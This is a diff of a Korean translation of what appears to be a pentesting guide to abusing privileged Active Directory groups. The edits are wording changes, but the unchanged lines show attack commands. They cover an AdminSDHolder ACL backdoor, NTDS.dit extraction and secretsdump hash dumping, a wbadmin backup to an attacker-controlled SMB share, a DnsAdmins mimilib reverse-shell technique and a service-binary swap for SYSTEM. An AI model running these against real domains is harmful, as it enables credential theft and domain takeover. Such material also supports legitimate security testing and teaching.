@@ -10,7 +10,7 @@
 
 ## 계정 운영자
 
-이 그룹은 도메인에서 관리자가 아닌 계정과 그룹을 생성할 수 있는 권한을 부여받습니다. 또한, 도메인 컨트롤러(DC)에 대한 로컬 로그인을 가능하게 합니다.
+이 그룹은 도메인에서 관리자가 아닌 계정 및 그룹을 생성할 수 있는 권한을 부여받습니다. 또한, 도메인 컨트롤러(DC)에 대한 로컬 로그인을 가능하게 합니다.
 
 이 그룹의 구성원을 식별하기 위해 다음 명령이 실행됩니다:
 ```powershell
@@ -30,7 +30,7 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-스크립트는 복원 프로세스를 가속화하는 데 사용할 수 있습니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+복원 프로세스를 가속화하기 위한 스크립트가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
 자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 방문하세요.
 
@@ -46,7 +46,7 @@ DC의 파일 접근은 사용자가 `Server Operators` 그룹의 일원이 아�
 
 ### 권한 상승
 
-`PsService` 또는 Sysinternals의 `sc`를 사용하여 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어, `Server Operators` 그룹은 특정 서비스에 대한 전체 제어 권한을 가지고 있어 임의의 명령 실행 및 권한 상승을 허용합니다.
+Sysinternals의 `PsService` 또는 `sc`를 사용하여 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어, `Server Operators` 그룹은 특정 서비스에 대한 전체 제어 권한을 가지고 있어 임의의 명령 실행 및 권한 상승을 허용합니다.
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -98,11 +98,11 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. 그림자 복사에서 `NTDS.dit` 복사:
+2. 그림자 복사본에서 `NTDS.dit` 복사:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-대안으로, 파일 복사를 위해 `robocopy`를 사용하세요:
+대안으로, 파일 복사를 위해 `robocopy`를 사용하십시오:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### wbadmin.exe 사용하기
 
-1. 공격자 머신에서 SMB 서버를 위한 NTFS 파일 시스템을 설정하고 대상 머신에 SMB 자격 증명을 캐시합니다.
+1. 공격자 머신에서 SMB 서버를 위한 NTFS 파일 시스템을 설정하고 대상 머신에서 SMB 자격 증명을 캐시합니다.
 2. 시스템 백업 및 `NTDS.dit` 추출을 위해 `wbadmin.exe`를 사용합니다:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -167,7 +167,7 @@ sc.exe \\dc01 start dns
 
 #### Mimilib.dll
 
-특정 명령이나 리버스 셸을 실행하도록 수정하여 명령 실행을 위해 mimilib.dll을 사용하는 것도 가능합니다. [이 게시물을 확인하십시오](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 더 많은 정보를 위해.
+특정 명령이나 리버스 셸을 실행하도록 수정하여 command execution을 위해 mimilib.dll을 사용하는 것도 가능합니다. [이 게시물 확인하기](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)에서 더 많은 정보를 얻을 수 있습니다.
 
 ### WPAD 레코드로 MitM
 
@@ -189,11 +189,11 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V 관리자는
 
-Hyper-V 관리자는 Hyper-V에 대한 전체 액세스 권한을 가지며, 이를 통해 가상화된 도메인 컨트롤러에 대한 제어를 얻을 수 있습니다. 여기에는 라이브 DC를 클론하고 NTDS.dit 파일에서 NTLM 해시를 추출하는 것이 포함됩니다.
+Hyper-V 관리자는 Hyper-V에 대한 전체 액세스 권한을 가지고 있으며, 이를 통해 가상화된 도메인 컨트롤러에 대한 제어를 얻을 수 있습니다. 여기에는 라이브 DC를 클론하고 NTDS.dit 파일에서 NTLM 해시를 추출하는 것이 포함됩니다.
 
 ### 악용 예시
 
-Firefox의 Mozilla Maintenance Service는 Hyper-V 관리자가 SYSTEM으로 명령을 실행하는 데 악용될 수 있습니다. 이는 보호된 SYSTEM 파일에 대한 하드 링크를 생성하고 이를 악성 실행 파일로 교체하는 것을 포함합니다:
+Firefox의 Mozilla Maintenance Service는 Hyper-V 관리자가 SYSTEM으로 명령을 실행하는 데 악용될 수 있습니다. 여기에는 보호된 SYSTEM 파일에 대한 하드 링크를 생성하고 이를 악성 실행 파일로 교체하는 것이 포함됩니다:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -201,15 +201,15 @@ sc.exe start MozillaMaintenance
 ```
 Note: 하드 링크 악용은 최근 Windows 업데이트에서 완화되었습니다.
 
-## Organization Management
+## 조직 관리
 
-**Microsoft Exchange**가 배포된 환경에서는 **Organization Management**라는 특별한 그룹이 중요한 권한을 가지고 있습니다. 이 그룹은 **모든 도메인 사용자의 메일박스에 접근할 수 있는 권한**을 가지며, **'Microsoft Exchange Security Groups'** 조직 단위(OU)에 대한 **전체 제어**를 유지합니다. 이 제어에는 권한 상승을 위해 악용될 수 있는 **`Exchange Windows Permissions`** 그룹이 포함됩니다.
+**Microsoft Exchange**가 배포된 환경에서는 **조직 관리**라는 특별한 그룹이 중요한 기능을 가지고 있습니다. 이 그룹은 **모든 도메인 사용자의 메일박스에 접근할 수 있는 권한**을 가지고 있으며, **'Microsoft Exchange 보안 그룹'** 조직 단위(OU)에 대한 **전체 제어**를 유지합니다. 이 제어에는 권한 상승을 위해 악용될 수 있는 **`Exchange Windows Permissions`** 그룹이 포함됩니다.
 
-### Privilege Exploitation and Commands
+### 권한 악용 및 명령
 
-#### Print Operators
+#### 인쇄 운영자
 
-**Print Operators** 그룹의 구성원은 **`SeLoadDriverPrivilege`**를 포함한 여러 권한을 부여받으며, 이를 통해 **도메인 컨트롤러에 로컬로 로그인**하고, 이를 종료하며, 프린터를 관리할 수 있습니다. 이러한 권한을 악용하기 위해서는, 특히 **`SeLoadDriverPrivilege`**가 낮은 권한의 컨텍스트에서 보이지 않는 경우, 사용자 계정 컨트롤(UAC)을 우회해야 합니다.
+**인쇄 운영자** 그룹의 구성원은 **`SeLoadDriverPrivilege`**를 포함한 여러 권한을 부여받으며, 이를 통해 **도메인 컨트롤러에 로컬로 로그인**하고, 종료하며, 프린터를 관리할 수 있습니다. 이러한 권한을 악용하기 위해서는, 특히 **`SeLoadDriverPrivilege`**가 낮은 권한의 컨텍스트에서 보이지 않는 경우, 사용자 계정 컨트롤(UAC)을 우회해야 합니다.
 
 이 그룹의 구성원을 나열하기 위해 다음 PowerShell 명령이 사용됩니다:
 ```powershell
@@ -224,11 +224,11 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-RDP를 악용하는 데 대한 추가 정보는 전용 pentesting 리소스에서 찾을 수 있습니다.
+RDP를 악용하는 데 대한 추가 정보는 전용 펜테스팅 리소스에서 찾을 수 있습니다.
 
 #### 원격 관리 사용자
 
-구성원은 **Windows Remote Management (WinRM)**을 통해 PC에 접근할 수 있습니다. 이러한 구성원의 열거는 다음을 통해 수행됩니다:
+구성원은 **Windows 원격 관리(WinRM)**를 통해 PC에 접근할 수 있습니다. 이러한 구성원의 열거는 다음을 통해 수행됩니다:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
